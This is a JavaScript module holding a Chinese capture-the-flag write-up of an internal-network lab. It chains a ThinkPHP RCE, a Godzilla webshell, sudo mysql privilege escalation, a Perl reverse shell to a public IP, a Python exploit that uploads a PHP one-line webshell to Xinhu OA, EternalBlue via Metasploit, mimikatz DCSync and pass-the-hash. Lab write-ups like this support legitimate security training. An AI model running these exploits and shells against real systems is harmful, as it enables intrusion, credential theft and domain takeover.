const n="# 工具\n\n1. vps：靶机有内网需要有自己的服务器\n2. fscan：内网扫描 https://github.com/shadow1ng/fscan（不仅能扫端口还能扫出常见漏洞）\n3. stowaway：内网代理 https://github.com/ph4ntonn/Stowaway\n4. 天狐渗透工具箱 https://pan.baidu.com/s/1mcgXmcsAoy5z52nWwAgRBg?pwd=ofox#list/path=%2F\n5. 哥斯拉 https://blog.csdn.net/zibery/article/details/124824833（先下载Java https://blog.csdn.net/2302_80713883/article/details/144346945 在文件处输入cmd然后java -jar filename.jar即可）\n\n# 正文\n\n## 先fscan扫描\n\n访问网址打开是一个XX 电源远程管理系统，直接用fscan尝试直接扫出漏洞\n\n```bash\n..scan -h ip  # 在IP地址后面跟/数字 → 子网掩码，表示一个网段范围\n              # 在http://开头的URL里跟/xxx → 网页路径\n```\n\n扫描后有两个端口，还有一个cve\n\n![image-lyXv.png](/images/image-lyXv.png)\n\n### flag01\n\n由于已经知道了是thinkphp漏洞，打开天狐工具，验证后getshell\n\n![image-Etrz.png](/images/image-Etrz.png)\n\n打开哥斯拉添加目标（感觉和用蚁剑差不多？）\n\n![image-jChv.png](/images/image-jChv.png)\n\n右键进入后命令执行\n\n```bash\nid        # 可以看到权限很低 uid=33(www-data) gid=33(www-data) groups=33(www-data)\nifconfig  # 看网卡，得知flag1为172.22.1.15\n```\n\n其次看用户的基本账户信息 `/etc/passwd` 或者 `printenv` 可以看一下环境变量\n\n```text\n/var/www/html/ > cat /etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:106:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:107:113::/nonexistent:/usr/sbin/nologin\nntp:x:108:115::/nonexistent:/usr/sbin/nologin\nsshd:x:109:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n_chrony:x:110:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin\nmysql:x:111:123:MySQL Server,,,:/nonexistent:/bin/false\n\n/var/www/html/ > printenv\n\nOLDPWD=/var/www/html\nAPACHE_RUN_DIR=/var/run/apache2\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nJOURNAL_STREAM=9:17176\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nINVOCATION_ID=4ac4a2cdae8947cf9f648ad23b8adf38\nAPACHE_LOCK_DIR=/var/lock/apache2\nLANG=C\nAPACHE_RUN_USER=www-data\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOG_DIR=/var/log/apache2\nPWD=/var/www/html\n```\n\n可以看到有mysql用户但我们可以更进一步，直接用 `sudo -l` 查看提权面\n\n**三个命令的作用：**\n\n- `printenv`：找\"泄露信息\"\n- `/etc/passwd`：找\"用户面\"\n- `sudo -l`：找\"提权面\"\n\n![image-UTsS.png](/images/image-UTsS.png)\n\n这里就可以很明显的看到用mysql提权\n\nhttps://gtfobins.org/ 直接搜mysql点进去可以看到\n\n```bash\nsudo mysql -e '. /bin/sh'\n\n# 即先用 sudo 运行 mysql，再让 mysql 客户端执行\"启动本地 shell\"。\n# 如果这个 mysql 进程本身是高权限启动的，那么弹出来的 shell 也会继承那个权限\n```\n\n这个命令在这应该并不能弹shell因为这里是非交换式的，尝试直接搜索flag\n\n```bash\nsudo mysql -e '. find / -name flag*'  # 可以看到 /root/flag/flag01.txt 文件\nsudo mysql -e '. tac /root/flag/flag01.txt'\n```\n\n得到flag01：`flag{60b53231-`\n\n### flag02\n\n接下来搭建内网代理\n\n先在哥斯拉文件管理上传一个agent文件以及fscan便于扫描（为了方便我创建了一个 `/var/www/html/lnitial`）\n\n切换到lnitial给stowaway的被控端一个可执行权限\n\n```bash\ncd lnitial\nchmod +x linux_x64_agent\n```\n\n接下来打开vps先把服务端admin文件放上去（我直接放在根目录下了）同理也给个权限\n\n```bash\ncd /\nchmod +x stowaway_admin\n./stowaway_admin -l 1111\n```\n\n开始监听后在被控端连接\n\n```bash\n./linux_x64_agent -c 服务器ip:1111\n```\n\n隧道打通：可以看到节点是0，于是切换节点到0，建立socks代理\n\n```bash\nuse 0\nsocks 2222\n```\n\n这里就可以用代理软件连接了\n\n##### stowaway还有个功能就是可以拿shell（此小标题为补充非题目必须）\n\n```bash\nshell\nid  # 此时还是 uid=33(www-data)，但没关系这里可以提权了\nsudo mysql -e '. /bin/sh'\n```\n\n这个时候就可以看到切换成功了，但这还不是交互式shell可以再开一台做监听端也就是攻击机\n\n```bash\nnc -lnvp 3333\n```\n\n在防守端输入\n\n```perl\nperl -e 'use Socket;$i=\"120.48.113.242\";$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'\n```\n\n此时才算是真正弹上交换式shell了\n\n```bash\nid    # uid=0(root) gid=0(root) groups=0(root)\nls\nchmod +x fscan  # 给个权限\n./fscan -h 172.22.1.0/24\n```\n\n![image-XHgH.png](/images/image-XHgH.png)\n\n可以看到有四台主机\n\n```text\n172.22.1.15  thinkphp rce 已经拿下flag01\n172.22.1.21  XIAORANG-WIN7.xiaorang.lab   MS17-010永恒之蓝\n172.22.1.2   DC01\n172.22.1.18  XIAORANG-OA01 信呼协同办公系统\n```\n\n##### proxifier\n\n172.22.1.18在内网所以需要连接代理，地址为vps的ip端口是2222，代理规则的目标主机写172.22.1.*\n\n##### 信呼OA RCE\n\n连上后可以看到信呼协同办公系统v2.2.8 搜索漏洞\n\n这里在kali上执行，准备一句话木马 `<?php eval($_POST[\"1\"]);?>` 保存为 `1.php`\n\n```python\nimport requests\n\nsession = requests.session()\n\nurl_pre = 'http://172.22.1.18/'\nurl1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'\nurl2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'\nurl3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'\n\ndata1 = {\n    'rempass': '0',\n    'jmpass': 'false',\n    'device': '1625884034525',\n    'ltype': '0',\n    'adminuser': 'YWRtaW4=',\n    'adminpass': 'YWRtaW4xMjM=',\n    'yanzm': ''\n}\n\nr = session.post(url1, data=data1)\nr = session.post(url2, files={'file': open('1.php', 'r+')})\n\nfilepath = str(r.json()['filepath'])\nfilepath = \"/\" + filepath.split('.uptemp')[0] + '.php'\nid = r.json()['id']\n\nurl3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'\n\nr = session.get(url3)\nr = session.get(url_pre + filepath + \"?1=system('dir');\")\nprint(r.text)\n```\n\n在桌面上创建一个lnitial文件夹然后把这两个文件放进去\n\n```bash\nsudo vim /etc/proxychains4.conf  # 这里最后写一个 socks5 vps的ip 2222\n\nproxychains python3 exp.py\n```\n\n可以看到一句话木马上传到网站上的绝对路径，这里访问相对路径就好\n\n然后在哥斯拉目标里面连接\n\n![image-Yzbm.png](/images/image-Yzbm.png)\n\n命令执行看当前用户发现就是系统用户system，于是直接看目录\n\n![image-JtUA.png](/images/image-JtUA.png)\n\n得到flag02：`2ce3-4813-87d4-`\n\n### flag03\n\n一共四台还有两台，因为172.22.1.21存在永恒之蓝可以直接用msf梭哈\n\n这台主机也是在内网里面所以同样的要用代理启动msf，在kali里执行：\n\n```bash\nproxychains msfconsole\n```\n\n然后搜索一下\n\n```bash\nsearch ms17  # 用第一个\n\nuse exploit/windows/smb/ms17_010_eternalblue\n```\n\n```bash\nset payload windows/x64/meterpreter/bind_tcp_uuid  # 设置一个监听器 bind正向的，因为反向是让服务器连接我们，而这里是内网\n\nshow options\n\nset RHOSTS 172.22.1.21\n\nrun\n\ngetuid  # 获得系统权限\n```\n\n**dcsync：直接拿到域控** [DCSync](https://c1trus.top/24-active-directory/movement/1-credentials/dcsync.html)\n\n```bash\nload kiwi  # 先加载mimikatz\nkiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv  # 抓用户的哈希，获取到了管理员的哈希用管理员的哈希进行哈希传递\n```\n\n在kali重开一个终端\n\n```bash\nproxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \"type Users.dministrator.lag.lag03.txt\"\n# 如果编码错误加个 --codec gbk 就行\n```\n\n得到flag03：`e8f88d0d43d6}`\n\n---\n\n**完整flag：** `flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}`\n";export{n as default};
